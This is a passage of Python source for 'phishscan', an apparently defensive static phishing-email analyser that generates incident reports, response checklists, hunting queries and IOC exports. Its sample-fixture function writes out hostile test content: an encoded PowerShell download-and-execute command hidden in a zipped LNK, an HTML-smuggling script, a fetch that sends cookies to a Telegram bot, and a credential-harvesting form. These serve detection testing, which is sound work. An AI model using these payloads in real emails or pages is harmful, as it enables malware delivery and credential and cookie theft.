            "Check proxy/EDR for the landing page and any download; confirm no credentials were typed",
            "If unsure, treat as credential exposure (below)", "Warn and coach the user"]))
    if a.creds or a.mfa:
        steps.append(("Credentials entered / MFA approved", [
            "Reset the password and REVOKE ALL SESSIONS & REFRESH TOKENS (AiTM kits steal session cookies - a reset alone is not enough)",
            "Review MFA methods and remove any attacker-added device; require re-registration",
            "Check inbox rules, forwarding, delegates, OAuth consents, Sent Items (lateral phishing)",
            "Review sign-in logs from the time of the click: new IP/country, device-code flow, legacy auth",
            "Hunt for the same actor on other accounts; tighten Conditional Access (compliant device, phishing-resistant MFA)",
            "If the user has finance/admin access, escalate to IR and inform the manager"]))
    if a.executed:
        steps.append(("Attachment EXECUTED / macros enabled", [
            "ISOLATE the host in EDR immediately", "Collect triage package (process tree, persistence, network, memory if possible)",
            "Hunt hashes/C2 across the fleet; reset credentials used on the host and any cached/privileged ones",
            "Reimage if compromise is confirmed; escalate to the Incident Response team"]))
    if "bec" in an.tags or "fin" in an.tags:
        steps.append(("Payment / BEC angle", [
            "Call Finance and the bank NOW if any payment was made or details changed (recall window is short)",
            "Verify requests out-of-band using a phone number from your directory, never from the e-mail",
            "Inform Legal / management; preserve evidence"]))
    if "toad" in an.tags:
        steps.append(("Callback phishing", ["Block/flag the phone number, warn users, check if anyone called or installed remote-access software"]))
    return steps


def exec_summary(an: Analysis):
    top = sorted([f for f in an.findings if f["pts"] > 0], key=lambda f: -f["pts"])[:5]
    kt = "; ".join(f["title"].split(":")[0][:90] for f in top) or "none"
    interact = []
    if an.args.clicked:
        interact.append("clicked a link")
    if an.args.creds:
        interact.append("entered credentials")
    if an.args.mfa:
        interact.append("approved an MFA prompt")
    if an.args.executed:
        interact.append("opened/executed an attachment")
    inter = ("The reporting user " + ", ".join(interact) + ".") if interact else "No user interaction has been reported."
    return (f"The e-mail with subject \"{an.subject or '(none)'}\" from {an.from_addr or 'unknown'}"
            f"{' (display name: ' + an.from_name + ')' if an.from_name else ''} was analysed statically (no URL was visited, no file executed). "
            f"Verdict: {an.verdict} (risk score {an.total}, confidence {an.confidence}). Classification: {an.classification}. "
            f"Top indicators: {kt}. The message contains {len(an.urls)} URL(s) and {len(an.attachments)} attachment(s). "
            f"{inter} Incident severity is rated {an.severity}.")


def automated_checklist(an: Analysis):
    f = lambda cat, kw: any(x["cat"] == cat and kw.lower() in x["title"].lower() for x in an.findings)
    A = an.auth
    rows = [
        ("Headers", "From / Reply-To / Return-Path compared", "DONE", "Reply-To mismatch!" if f("Header", "reply-to") else "consistent"),
        ("Headers", "Display-name spoof / brand impersonation", "FOUND" if f("Header", "display name") else "OK", ""),
        ("Headers", "Received chain traced, origin IP identified", "DONE" if an.hops else "MISSING", an.origin_ip or "no public IP"),
        ("Headers", "HELO/rDNS, timestamp & Date anomalies", "FOUND" if (f("Header", "helo") or f("Header", "timestamp") or f("Header", "date header")) else "OK", ""),
        ("Headers", "Mailer / bulk-sender fingerprint", "FOUND" if f("Header", "mailer") else "OK", an.mailer),
        ("Auth", "SPF result", (A.get("spf") or "n/a").upper(), an.authinfo.get("spf_domain", "")),
        ("Auth", "DKIM result", (A.get("dkim") or "n/a").upper(), ",".join(sorted({d for d, _ in an.authinfo.get('dkim', [])} | {x['d'] for x in an.authinfo.get('dkim_sigs', [])}))),
        ("Auth", "DMARC result", (A.get("dmarc") or "n/a").upper(), "policy p=" + (an.authinfo.get("dmarc_policy") or "?")),
        ("Auth", "Alignment with visible From", "ALIGNED" if (an.authinfo.get("spf_aligned") or an.authinfo.get("dkim_aligned")) else "NOT ALIGNED", ""),
        ("Auth", "Sender domain age (WHOIS/RDAP)", "DONE" if an.domain_age else "RUN --online / manual", str({k: v for k, v in an.domain_age.items()})),
        ("Body", "Urgency / threat / authority language", "FOUND" if (an.body_info["urgency"] or an.body_info["authority"]) else "OK", ""),
        ("Body", "Credential / payment / secrecy request", "FOUND" if (an.body_info["credential"] or an.body_info["financial"] or an.body_info["secrecy"]) else "OK", ""),
        ("Body", "Hidden text / forms / scripts / zero-width", "FOUND" if (f("Body", "hidden") or f("Body", "form") or f("Body", "script") or f("Body", "zero-width")) else "OK", ""),
        ("Body", "Link text vs real href", "MISMATCH" if f("Body", "link text") else "OK", ""),
        ("Body", "QR codes", "FOUND" if an.qr_results else ("NOT CHECKED (no decoder)" if an.qr_supported is False else "none"), ""),
        ("URLs", "All URLs extracted, defanged, analysed", "DONE", f"{len(an.urls)} URL(s), {sum(1 for u in an.urls if u['pts'] >= 3)} suspicious"),
        ("URLs", "Lookalike / punycode / shortener / abused platform", "FOUND" if any(any(k in t for k in ("Lookalike", "Punycode", "shortener", "Abused", "SUBDOMAIN")) for u in an.urls for t in u["flags"]) else "OK", ""),
        ("URLs", "Reputation + landing-page scan (urlscan / VT)", "DONE" if an.intel["vt"] else "MANUAL", "use pivots section"),
        ("Attachments", "True type vs extension, hashes", "DONE" if an.attachments else "no attachments", ""),
        ("Attachments", "Macros / scripts / smuggling / embedded objects", "FOUND" if any(x["cat"] == "Attachment" and x["pts"] >= 3 for x in an.findings) else ("OK" if an.attachments else "n/a"), ""),
        ("Attachments", "Sandbox detonation", "MANUAL", "submit hash/file to any.run / Joe / Hybrid Analysis if still unclear"),
        ("Scope", "Other recipients / clickers / endpoint hits", "MANUAL", "run hunting queries"),
        ("Scope", "Inbox rules, MFA changes, OAuth consent (if creds exposed)", "MANUAL" if (an.args.creds or an.args.mfa or an.args.clicked) else "n/a", ""),
        ("Closure", "Purge, block, IOCs added, user notified, report filed", "MANUAL", ""),
    ]
    return rows


def build_report(an: Analysis, case_id: str):
    a = an.args
    S = []  # sections: (title, [blocks])
    sev_sorted = sorted(an.findings, key=lambda x: (-x["pts"], -SEV_ORDER[x["sev"]]))

    # 1 case info
    S.append(("1. Case information", [("kv", [
        ("Case ID", case_id), ("Report generated", fmt_dt(an.analysis_time)), ("Analyst", a.analyst or "-"),
        ("Reported by", a.reported_by or "-"), ("Source file", os.path.basename(an.path)),
        ("SHA256 (.eml)", an.sha256), ("MD5 (.eml)", an.md5), ("Size", f"{len(an.raw):,} bytes"),
        ("Verdict", an.verdict), ("Risk score", f"{an.total} (confidence {an.confidence})"),
        ("Incident severity", an.severity), ("Classification", an.classification),
        ("User interaction", ", ".join([x for x, on in (("clicked", a.clicked), ("entered credentials", a.creds),
                                                          ("approved MFA", a.mfa), ("executed attachment", a.executed)) if on]) or "none reported"),
        ("Status", a.status), ("Tool", f"phishscan {VERSION} (static analysis only)")])]))

    # 2 exec summary
    S.append(("2. Executive summary", [("para", exec_summary(an))]))

    # 3 scoring
    rows = [[c, str(v[1]), str(v[2]), str(v[0])] for c, v in an.scores.items()]
    rows.append(["TOTAL", "", "", str(an.total)])
    S.append(("3. Verdict and risk scoring", [
        ("para", f"VERDICT: {an.verdict}   |   Score {an.total}   |   Confidence {an.confidence}   |   Thresholds: >=16 malicious, >=8 suspicious, >=3 low-risk"),
        ("table", ["Category", "Raw points", "Cap", "Counted"], rows)]))

    # 4 key findings
    frows = [[f["sev"], f["cat"], f["title"], f["detail"][:220], str(f["pts"])] for f in sev_sorted]
    S.append(("4. Findings (sorted by weight)", [("table", ["Severity", "Category", "Finding", "Detail", "Pts"], frows)
                                                  if frows else ("para", "No findings.")]))

    # 5 email details
    S.append(("5. E-mail details", [("kv", [
        ("Subject", an.subject), ("From (display)", an.from_name), ("From (address)", an.from_addr),
        ("Reply-To", an.h("Reply-To") or "-"), ("Return-Path", an.h("Return-Path") or "-"),
        ("To / Cc", ", ".join(an.recipients[:10]) or "-"), ("Date", an.h("Date")), ("Message-ID", an.message_id or "-"),
        ("X-Mailer / User-Agent", an.mailer or "-"), ("MIME parts", f"{len(an.text_parts)} text, {len(an.html_parts)} html, {len(an.raw_atts)} attachment(s), {len(an.inline_imgs)} inline image(s)")])]))

    # 6 header analysis
    hb = [("kv", [("Origin IP (bottom-most public hop)", defang(an.origin_ip) if an.origin_ip else "none found"),
                  ("Reverse DNS of origin", getattr(an, "rdns", "") or "(run --online)"),
                  ("Received hops", str(len(an.hops)))])]
    if an.hops:
        hb.append(("table", ["#", "From (HELO)", "By", "IPs", "Timestamp (UTC)"],
                   [[str(h["n"]), h["from"][:40], h["by"][:40], defang(", ".join(h["ips"])) or "-", fmt_dt(h["ts"])] for h in an.hops]))
        hb.append(("para", "Read the chain bottom-to-top: the BOTTOM hop is closest to the sender. Hop #1 is your own gateway."))
    hf = [f for f in an.findings if f["cat"] == "Header"]
    hb.append(("list", [f"[{x['sev']}] {x['title']} - {x['detail']}" for x in hf] or ["No header anomalies."]))
    if an.spam_hdrs:
        hb.append(("kv", list(an.spam_hdrs.items())))
    S.append(("6. Header analysis", hb))

    # 7 authentication
    A = an.auth
    ai = an.authinfo
    ab = [("table", ["Mechanism", "Result", "Domain / detail", "Aligned with From?"], [
        ["SPF", (A.get("spf") or "n/a"), ai.get("spf_domain") or "-", "yes" if ai.get("spf_aligned") else "no"],
        ["DKIM", (A.get("dkim") or "n/a"), ", ".join(sorted({d for d, _ in ai.get('dkim', [])} | {x['d'] for x in ai.get('dkim_sigs', [])})) or "-", "yes" if ai.get("dkim_aligned") else "no"],
        ["DMARC", (A.get("dmarc") or "n/a"), "policy p=" + (ai.get("dmarc_policy") or "?"), "-"],
        ["ARC", (A.get("arc") or "n/a"), "", "-"], ["CompAuth (MS)", (A.get("compauth") or "n/a"), "", "-"]])]
    verdict_txt = []
    if A.get("dmarc") == "fail":
        verdict_txt.append("DMARC fail -> sender is not authorised for the visible From domain (spoof or attacker infrastructure).")
    if (A.get("spf") == "pass" or A.get("dkim") == "pass") and not (ai.get("spf_aligned") or ai.get("dkim_aligned")):
        verdict_txt.append("SPF/DKIM 'pass' but for a DIFFERENT domain than From: authentication passing is not proof of legitimacy.")
    if A.get("dmarc") == "pass":
        verdict_txt.append("Fully aligned pass: either genuine, a COMPROMISED legitimate account, or an attacker-owned look-alike domain. Check domain age and context.")
    if not any(A.values()):
        verdict_txt.append("No gateway authentication results in this file.")
    ab.append(("list", verdict_txt))
    if an.dns:
        ab.append(("kv", [("SPF record (DNS)", " | ".join(an.dns.get("spf") or []) or "none"),
                          ("DMARC record (DNS)", " | ".join(an.dns.get("dmarc") or []) or "none")]))
    if an.domain_age:
        ab.append(("table", ["Domain", "Age (days)"], [[defang(d), "unknown" if v is None else str(v)] for d, v in an.domain_age.items()]))
    else:
        ab.append(("para", "Domain age not checked (run with --online, or manually: whois / rdap.org)."))
    ab.append(("list", [f"[{x['sev']}] {x['title']} - {x['detail']}" for x in an.findings if x["cat"] == "Authentication"]))
    S.append(("7. Authentication analysis (SPF / DKIM / DMARC)", ab))

    # 8 body
    bi = an.body_info
    bb = [("kv", [("Urgency/threat terms", ", ".join(bi["urgency"]) or "-"), ("Credential terms", ", ".join(bi["credential"]) or "-"),
                  ("Financial terms", ", ".join(bi["financial"]) or "-"), ("Secrecy/BEC terms", ", ".join(bi["secrecy"]) or "-"),
                  ("Authority terms", ", ".join(bi["authority"]) or "-"), ("Generic greeting", bi["generic_greeting"] or "-"),
                  ("Visible text length", str(bi["text_len"]))])]
    if an.html_features:
        bb.append(("kv", [(k.replace("_", " "), str(v)) for k, v in an.html_features.items()]))
    if an.qr_results:
        bb.append(("table", ["Image", "Decoded QR content (defanged)"], [[n, defang(v)] for n, v in an.qr_results]))
    bb.append(("list", [f"[{x['sev']}] {x['title']} - {x['detail']}" for x in an.findings if x["cat"] == "Body"] or ["No body indicators."]))
    S.append(("8. Body analysis", bb))

    # 9 urls
    urows = [[defang(u["url"])[:140], u["source"][:40], str(u["pts"]), "; ".join(u["flags"])[:300] or "-"] for u in sorted(an.urls, key=lambda x: -x["pts"])]
    S.append(("9. URL analysis (never click - defanged)", [
        ("table", ["URL (defanged)", "Source", "Score", "Flags"], urows) if urows else ("para", "No URLs found."),
        ("para", "Next manual steps: scan in urlscan.io (screenshot, redirects, form action / Telegram exfil), check VirusTotal/URLhaus/PhishTank, WHOIS age, crt.sh for sibling domains.")]))

    # 10 attachments
    ablocks = []
    if not an.attachments:
        ablocks.append(("para", "No attachments."))
    for r in an.attachments:
        ablocks.append(("kv", [("File", r["name"]), ("True type", r["magic"]), ("Size / entropy", f"{r['size']:,} B / {r['entropy']}"),
                               ("SHA256", r["sha256"]), ("MD5", r["md5"])]))
        ablocks.append(("list", [f"[{s}] {t} (+{p})" for s, t, p in r["flags"]] + r["notes"] or ["No indicators."]))
        if r["children"]:
            ablocks.append(("para", "Contents: " + ", ".join(r["children"][:25])))
        if r["commands"]:
            ablocks.append(("list", ["Suspicious: " + c for c in r["commands"][:12]]))
        if r["blobs"]:
            ablocks.append(("table", ["Offset", "Kind", "Decoded preview"], [[str(b["offset"]), b["kind"], defang(b["preview"][:200])] for b in r["blobs"][:6]]))
        if r["urls"]:
            ablocks.append(("list", ["Embedded URL: " + defang(u) for u in r["urls"][:12]]))
    S.append(("10. Attachment analysis", ablocks))

    # 11 intel
    ib = []
    if an.intel["vt"]:
        ib.append(("table", ["Type", "Indicator", "Malicious", "Suspicious", "Harmless", "Info"],
                   [[v["kind"], (defang(v["value"]) if v["kind"] != "file" else v["value"][:20] + "..."), str(v.get("malicious", 0)), str(v.get("suspicious", 0)),
                     str(v.get("harmless", 0)), (v.get("label") or v.get("error") or ("not found" if not v.get("found") else ""))] for v in an.intel["vt"]]))
    if an.intel["abuseipdb"]:
        ib.append(("table", ["IP", "Abuse score", "Country", "ISP", "Usage", "Reports"],
                   [[defang(v["ip"]), str(v["score"]), v["country"], v["isp"], v["usage"], str(v["reports"])] for v in an.intel["abuseipdb"]]))
    ib.append(("list", an.intel["notes"] or (["Enrichment done."] if (an.intel["vt"] or an.intel["abuseipdb"]) else ["Offline run: use --online with API keys, or the pivot links below."])))
    S.append(("11. Threat-intelligence enrichment", ib))

    # 12 IOCs
    order = {"email": 0, "ip": 1, "domain": 2, "url": 3, "sha256": 4, "md5": 5, "filename": 6, "subject": 7, "message-id": 8,
             "mailer": 9, "phone": 10, "crypto-address": 11}
    iocs = sorted(an.iocs, key=lambda i: (order.get(i["type"], 99), i["value"]))
    S.append(("12. Indicators of compromise (defanged)", [
        ("table", ["Type", "Value", "Context"], [[i["type"], defang(i["value"]) if i["type"] in ("url", "domain", "ip", "email") else i["value"][:160], i["context"]] for i in iocs]),
        ("para", "Raw (non-defanged) IOCs for blocklists/SIEM ingestion are in iocs.csv - handle with care.")]))

    # 13 scope
    q, purge, splunk = build_queries(an, case_id)
    sb = [("para", "Run these to find other victims. Adjust time ranges and table names to your environment.")]
    for k, v in q.items():
        sb.append(("para", "KQL - " + k))
        sb.append(("code", v))
    sb.append(("para", "Exchange / Purview containment commands"))
    sb.append(("code", purge))
    sb.append(("para", "Splunk (generic) proxy/DNS/firewall hunt"))
    sb.append(("code", splunk))
    S.append(("13. Scope and hunting queries", sb))

    # 14 response
    rb = []
    for title, items in response_plan(an):
        rb.append(("para", title))
        rb.append(("list", ["[ ] " + x for x in items]))
    S.append(("14. Response and containment plan", rb))

    # 15 recommendations
    rec_short = ["Block IOCs listed above; purge all copies; hunt other recipients."]
    rec_long = ["Enforce DMARC p=quarantine/reject on your own domains; add external-sender banner.",
                "Phishing-resistant MFA (FIDO2/passkeys) + Conditional Access (compliant device, block legacy auth, block device-code flow if unused).",
                "Enable Safe Links / Safe Attachments, detonate attachments, block ISO/IMG/LNK/HTML-with-script/OneNote attachments where not needed.",
                "Block newly-registered domains (<30 days) and risky TLDs at proxy/DNS; QR-code scanning on gateway.",
                "Disable Office macros from the internet (Mark-of-the-Web); restrict external auto-forwarding.",
                "User awareness: easy 'Report phish' button, feedback to reporters, targeted training for finance/HR/executives."]
    if "cred" in an.tags:
        rec_short.append("Check sign-ins and inbox rules for anyone who clicked; consider forcing re-authentication for exposed users.")
    if "malware" in an.tags:
        rec_short.append("Submit the attachment to a sandbox and hunt hashes/C2 on endpoints; verify EDR coverage on recipients.")
    S.append(("15. Recommendations", [("para", "Short term"), ("list", rec_short), ("para", "Long term"), ("list", rec_long)]))

    # 16 mitre
    S.append(("16. MITRE ATT&CK mapping", [("table", ["Technique", "Name"], [[t, MITRE.get(t, "")] for t in sorted(an.mitre)])]))

    # 17 checklist
    S.append(("17. Analyst checklist (auto-filled; MANUAL = still to do)", [("table", ["Area", "Check", "Status", "Note"], [list(map(str, r)) for r in automated_checklist(an)])]))

    # 18 timeline
    tl = []
    if an.date_dt:
        tl.append((an.date_dt, "Message 'Date' header"))
    for h in an.hops:
        if h["ts"]:
            tl.append((h["ts"], f"Hop #{h['n']}: {h['from'] or '?'} -> {h['by'] or '?'}"))
    tl.sort(key=lambda x: x[0])
    trows = [[fmt_dt(t), e] for t, e in tl] + [[fmt_dt(an.analysis_time), "Analysis performed by phishscan"]]
    S.append(("18. Timeline (fill in user-interaction and response times manually)", [("table", ["Time (UTC)", "Event"], trows)]))

    # 19 pivots
    pb = []
    for title, lines in pivots(an):
        pb.append(("para", title))
        pb.append(("list", lines))
    S.append(("19. Manual pivots / next steps", pb or [("para", "None")]))

    # 20 appendix
    S.append(("20. Appendix: raw headers", [("code", an.raw_headers[:20000])]))
    S.append(("Sign-off", [("para", f"Prepared by: {a.analyst or '____________'}    Reviewed by: ____________    Date: {an.analysis_time.strftime('%Y-%m-%d')}"),
                           ("para", "Automated static analysis aids but does not replace analyst judgement. Always validate with sandbox / threat-intel before closing.")]))
    return S


def md_cell(s):
    return str(s).replace("|", "\\|").replace("\n", " ").replace("\r", " ")


def render_md(an, sections, case_id):
    out = [f"# PHISHING EMAIL ANALYSIS REPORT - {case_id}", "",
           f"**Verdict: {an.verdict}** | Score {an.total} | Severity {an.severity} | Confidence {an.confidence}", ""]
    for title, blocks in sections:
        out += [f"## {title}", ""]
        for b in blocks:
            k = b[0]
            if k == "kv":
                out += ["| Field | Value |", "|---|---|"] + [f"| {md_cell(x)} | {md_cell(y)} |" for x, y in b[1]] + [""]
            elif k == "table":
                out += ["| " + " | ".join(b[1]) + " |", "|" + "---|" * len(b[1])]
                out += ["| " + " | ".join(md_cell(c) for c in r) + " |" for r in b[2]] + [""]
            elif k == "list":
                out += [f"- {x}" for x in b[1]] + [""]
            elif k == "code":
                out += ["```", b[1], "```", ""]
            elif k == "para":
                out += [b[1], ""]
    return "\n".join(out)


HTML_CSS = """
:root{--bg:#f6f7f9;--card:#fff;--fg:#1d2330;--mut:#667085;--bd:#e3e6ec;--acc:#2b59c3;--code:#0f172a;--codefg:#e2e8f0}
@media (prefers-color-scheme:dark){:root{--bg:#0f131a;--card:#171c26;--fg:#e6e9ef;--mut:#98a2b3;--bd:#2a3140;--acc:#7aa2ff}}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
.wrap{max-width:1100px;margin:0 auto;padding:24px}
header.top{background:var(--card);border:1px solid var(--bd);border-radius:14px;padding:22px;margin-bottom:18px}
h1{margin:0 0 6px;font-size:22px}h2{font-size:17px;margin:0 0 12px;color:var(--acc)}
section{background:var(--card);border:1px solid var(--bd);border-radius:14px;padding:18px 20px;margin-bottom:14px}
table{border-collapse:collapse;width:100%;margin:8px 0 14px;font-size:13px}th,td{border:1px solid var(--bd);padding:6px 9px;text-align:left;vertical-align:top;word-break:break-word}
th{background:rgba(127,127,127,.12)}.scroll{overflow-x:auto}
pre{background:var(--code);color:var(--codefg);padding:12px;border-radius:8px;overflow:auto;font-size:12px}
.badge{display:inline-block;padding:3px 12px;border-radius:999px;color:#fff;font-weight:700;margin-right:8px}
.MALICIOUS{background:#c62828}.SUSPICIOUS{background:#ef6c00}.LOW{background:#b08900}.NO{background:#2e7d32}
.sev-CRITICAL,.sev-HIGH{color:#c62828;font-weight:700}.sev-MEDIUM{color:#ef6c00;font-weight:700}.sev-LOW{color:#8a6d00}.sev-INFO{color:var(--mut)}
ul{margin:6px 0 12px 18px;padding:0}.mut{color:var(--mut)}td.k{width:230px;font-weight:600}
"""


def render_html(an, sections, case_id):
    esc = htmllib.escape
    badge = "MALICIOUS" if an.verdict.startswith("MAL") else "SUSPICIOUS" if an.verdict.startswith("SUSP") else "LOW" if an.verdict.startswith("LOW") else "NO"
    o = ["<!doctype html><html lang='en'><head><meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>",
         f"<title>Phishing Analysis {esc(case_id)}</title><style>{HTML_CSS}</style></head><body><div class='wrap'>",
         f"<header class='top'><h1>Phishing E-mail Analysis Report</h1><div class='mut'>{esc(case_id)} &middot; {esc(fmt_dt(an.analysis_time))}</div>",
         f"<p><span class='badge {badge}'>{esc(an.verdict)}</span> score <b>{an.total}</b> &middot; severity <b>{esc(an.severity)}</b> &middot; confidence <b>{esc(an.confidence)}</b> &middot; {esc(an.classification)}</p></header>"]
    for title, blocks in sections:
        o.append(f"<section><h2>{esc(title)}</h2>")
        for b in blocks:
            k = b[0]
            if k == "kv":
                o.append("<div class='scroll'><table>" + "".join(f"<tr><td class='k'>{esc(str(x))}</td><td>{esc(str(y))}</td></tr>" for x, y in b[1]) + "</table></div>")
            elif k == "table":
                rows = ""
                for r in b[2]:
                    cells = ""
                    for ci, c in enumerate(r):
                        c = str(c)
                        cells += f"<td class='sev-{esc(c)}'>{esc(c)}</td>" if c in SEV_ORDER and ci == 0 else f"<td>{esc(c)}</td>"
                    rows += f"<tr>{cells}</tr>"
                o.append("<div class='scroll'><table><tr>" + "".join(f"<th>{esc(h)}</th>" for h in b[1]) + f"</tr>{rows}</table></div>")
            elif k == "list":
                o.append("<ul>" + "".join(f"<li>{esc(str(x))}</li>" for x in b[1]) + "</ul>")
            elif k == "code":
                o.append(f"<pre>{esc(b[1])}</pre>")
            elif k == "para":
                o.append(f"<p>{esc(b[1])}</p>")
        o.append("</section>")
    o.append("</div></body></html>")
    return "\n".join(o)


# ----------------------------------------------------------------------------
# SAMPLE GENERATOR (harmless test fixture)
# ----------------------------------------------------------------------------
def make_sample(path):
    from email.message import EmailMessage
    payload_b64 = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://payload-host.top/a.ps1')".encode("utf-16-le")).decode()
    fake_pe_b64 = base64.b64encode(b"MZ" + b"PHISHSCAN-TEST-FIXTURE-NOT-AN-EXECUTABLE" * 4).decode()
    msg = EmailMessage()
    msg["Received"] = "from mx.company.test (mx.company.test [10.0.0.5]) by inbox.company.test with ESMTPS; Sat, 10 Oct 2026 09:12:08 +0000"
    msg.add_header("Received", "from vps123.cheaphost.xyz (unknown [203.0.113.45]) by mx.company.test with ESMTP; Sat, 10 Oct 2026 09:12:05 +0000")
    msg.add_header("Received", "from localhost (localhost [127.0.0.1]) by vps123.cheaphost.xyz (Postfix) with ESMTP; Sat, 10 Oct 2026 09:11:59 +0000")
    msg["Authentication-Results"] = ("mx.company.test; spf=pass smtp.mailfrom=bounce@mailer.cheapbulk.ru; "
                                     "dkim=pass header.d=cheapbulk.ru; dmarc=fail (p=none sp=none) action=none header.from=micros0ft-secure.com; "
                                     "compauth=fail reason=001")
    msg["X-Forefront-Antispam-Report"] = "CIP:203.0.113.45;CTRY:NL;SFV:NSPM;CAT:PHSH;SCL:9"
    msg["Return-Path"] = "<bounce@mailer.cheapbulk.ru>"
    msg["From"] = '"Microsoft 365 Support" <no-reply@micros0ft-secure.com>'
    msg["Reply-To"] = "helpdesk.m365.support@gmail.com"
    msg["To"] = "undisclosed-recipients:;"
    msg["Subject"] = "RE: Action Required: Your password expires within 24 hours"
    msg["Date"] = "Sat, 10 Oct 2026 09:11:50 +0000"
    msg["Message-ID"] = "<a81c9f@vps123.cheaphost.xyz>"
    msg["X-Mailer"] = "PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)"
    msg.set_content("Your password expires in 24 hours. Verify your account: http://login.microsoftonline.com.secure-verify-m365.top/auth?u=victim@company.com")
    html = f"""<html><body>
<div style="display:none;font-size:0">invoice payment security alert bank details</div>
<p>Dear user,</p>
<p><b>Security alert:</b> unusual activity was detected. Your password will expire immediately and your account will be suspended
 within 24 hours unless you verify your account now. Failure to act will result in termination of access.</p>
<p><a href="https://login.microsoftonline.com.secure-verify-m365.top/auth?u=victim@company.com#victim@company.com">https://login.microsoftonline.com/verify</a></p>
<p><a href="https://bit.ly/3xYzAbc">Review unauthorized sign-in</a></p>
<form action="http://secure-verify-m365.top/gate.php" method="post"><input type="password" name="p"></form>
<p>This is confidential, please keep this between us and reply only by email. Wire transfer details attached.</p>
<img src="http://track.cheapbulk.ru/open/pixel.gif" width="1" height="1">
<p>Microsoft Corporation, One Microsoft Way</p></body></html>"""
    msg.add_alternative(html, subtype="html")
    smuggle = f"""<html><body><script>
var d=atob("{fake_pe_b64}");var b=new Uint8Array(d.length);for(var i=0;i<d.length;i++)b[i]=d.charCodeAt(i);
var blob=new Blob([b],{{type:'application/octet-stream'}});var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='update.exe';a.click();
fetch('https://api.telegram.org/bot123456:ABC/sendMessage?chat_id=1&text='+document.cookie);
</script><form action="https://formsubmit.co/attacker@example.com"><input type="password"></form></body></html>"""
    msg.add_attachment(smuggle.encode(), maintype="text", subtype="html", filename="Password_Update.html")
    pdf = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction 2 0 R/Pages 3 0 R>>endobj\n"
           b"2 0 obj<</S/JavaScript/JS(app.alert('x'))>>endobj\n"
           b"4 0 obj<</Type/Action/S/URI/URI(http://invoice-portal-docs.xyz/view?id=8841)>>endobj\ntrailer<<>>\n%%EOF")
    msg.add_attachment(pdf, maintype="application", subtype="pdf", filename="Invoice_8841.pdf")
    lnk = b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F" + \
          "powershell -nop -w hidden -enc {}".format(payload_b64).encode("utf-16-le")
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("Invoice.lnk", lnk)
    msg.add_attachment(zbuf.getvalue(), maintype="application", subtype="zip", filename="Documents.zip")
    msg.add_attachment(b"MZ" + b"\x00" * 60 + b"harmless test fixture", maintype="application", subtype="octet-stream", filename="Scan_0042.pdf.exe")
    with open(path, "wb") as f:
        f.write(msg.as_bytes())
    print(f"[+] sample phishing e-mail written to {path} (harmless fixture, fake domains)")


# ----------------------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------------------
class C:
    on = sys.stdout.isatty()

    @staticmethod
    def c(code, s):
        return f"\033[{code}m{s}\033[0m" if C.on else s


def load_file(path):
    if path == "-":
        return sys.stdin.buffer.read()
    if path.lower().endswith(".msg"):
        if shutil.which("msgconvert"):
            tmp = path + ".eml"
            subprocess.run(["msgconvert", "--outfile", tmp, path], check=True)
            with open(tmp, "rb") as f:
                return f.read()
        sys.exit("[!] .msg needs conversion: install msgconvert (libemail-outlook-message-perl) or in Outlook use "
                 "'Save as' / forward as attachment to get .eml, then re-run.")
    with open(path, "rb") as f:
        return f.read()


def analyze_one(path, args):
    raw = load_file(path)
    base = os.path.splitext(os.path.basename(path))[0] if path != "-" else "stdin"
    case_id = args.case or "PHISH-" + datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    if args.files and len(args.files) > 1:
        case_id += "-" + re.sub(r"\W+", "_", base)[:20]
    a = argparse.Namespace(**vars(args))
    a.out = os.path.join(args.out, base) if len(args.files) > 1 else args.out
    os.makedirs(a.out, exist_ok=True)
    an = Analysis(path, raw, a).run()
    sections = build_report(an, case_id)
    fmts = [f.strip().lower() for f in args.format.split(",")]
    written = []
    if "md" in fmts:
        p = os.path.join(a.out, "report.md")
        open(p, "w", encoding="utf-8").write(render_md(an, sections, case_id))
        written.append(p)
    if "html" in fmts:
        p = os.path.join(a.out, "report.html")
        open(p, "w", encoding="utf-8").write(render_html(an, sections, case_id))
        written.append(p)
    if "json" in fmts:
        p = os.path.join(a.out, "report.json")
        data = {"case_id": case_id, "file": path, "sha256": an.sha256, "verdict": an.verdict, "score": an.total,
                "confidence": an.confidence, "severity": an.severity, "classification": an.classification,
                "scores": {k: v[0] for k, v in an.scores.items()}, "findings": an.findings, "iocs": an.iocs,
                "urls": an.urls, "attachments": an.attachments, "auth": an.auth, "authinfo": an.authinfo,
                "mitre": sorted(an.mitre), "intel": an.intel, "headers": {"from": an.from_addr, "subject": an.subject,
                                                                          "origin_ip": an.origin_ip, "recipients": an.recipients}}
        json.dump(data, open(p, "w", encoding="utf-8"), indent=2, default=str)
        written.append(p)
    p = os.path.join(a.out, "iocs.csv")
    with open(p, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["type", "value", "context", "case_id"])
        for i in an.iocs:
            w.writerow([i["type"], i["value"], i["context"], case_id])
    written.append(p)
    # console summary
    col = {"MALICIOUS": "1;31", "SUSPICIOUS": "1;33"}.get(an.verdict.split(" /")[0], "1;32")
    print("=" * 74)
    print(C.c("1", f" {os.path.basename(path)}") + f"   case {case_id}")
    print(f" VERDICT : {C.c(col, an.verdict)}   score {an.total}   confidence {an.confidence}   severity {an.severity}")
    print(f" CLASS   : {an.classification}")
    print(f" FROM    : {an.from_name!r} <{defang(an.from_addr)}>   SUBJECT: {an.subject[:60]}")
    print(f" ORIGIN  : {defang(an.origin_ip) or 'n/a'}   SPF={an.auth.get('spf')} DKIM={an.auth.get('dkim')} DMARC={an.auth.get('dmarc')}")
    print(f" URLs    : {len(an.urls)} ({sum(1 for u in an.urls if u['pts'] >= 3)} suspicious)   Attachments: {len(an.attachments)}   IOCs: {len(an.iocs)}")
    print("-" * 74)
    for f in sorted(an.findings, key=lambda x: -x["pts"])[:(100 if args.verbose else 14)]:
        if f["pts"] > 0 or args.verbose:
